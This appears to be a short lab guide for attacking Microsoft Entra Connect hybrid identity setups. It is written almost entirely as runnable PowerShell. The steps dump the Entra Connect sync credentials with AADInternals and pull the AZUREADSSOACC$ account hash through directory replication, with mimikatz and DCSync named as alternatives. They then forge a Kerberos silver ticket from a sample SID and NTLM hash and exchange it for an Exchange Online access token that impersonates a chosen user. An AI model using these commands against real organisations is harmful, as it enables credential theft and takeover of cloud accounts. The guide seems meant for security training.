## lab 2 - Entra Connect Attacks
1. Dumping and Extracting Entra (Azure AD) Connect credentials:
    1. run powershell as admin on the server where Entra Connect is installed
    2. execute:
        ```powershell
        Import-Module AADInternals
        Get-AADIntSyncCredentials
        ```


2. reset password


## 3. Silver Ticket Attack ##
1. get Sync's SID:
    ```powershell
    Import-Module AzureAD
    Connect-AzureAD # use the dumped Entra Connect creds

    # find victim user to impersonate
    Get-AzureADUser | Select UserPrincipalName,OnPremisesSecurityIdentifier

    Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain mylab.local -Server dcVm
    ```
    


    Obtain Sync_xx user’s SID  (by running mimikatz / other credentials dump tool or alternatively extract the plain text credentials on the server that is running Entra Connect, or alternatively using DCSync)​

    Generate a Kerberos ticket for the synced user that we wish to impersonate, using its SID + NTLM hash of the AZUREADSSOACC$ machine account:​
    $kerberos=New-AADIntKerberosTicket -SidString "S-1-5-21-722990657-2348522304-2045722228-1120" -Hash "6540a1298884fb7d186afdc9e29f1bb7"​

    Obtain an access token to a specific resource using that Kerberos ticket:​
    $at=Get-AADIntAccessTokenForEXO -KerberosTicket $kerberos -Domain xspm-research.net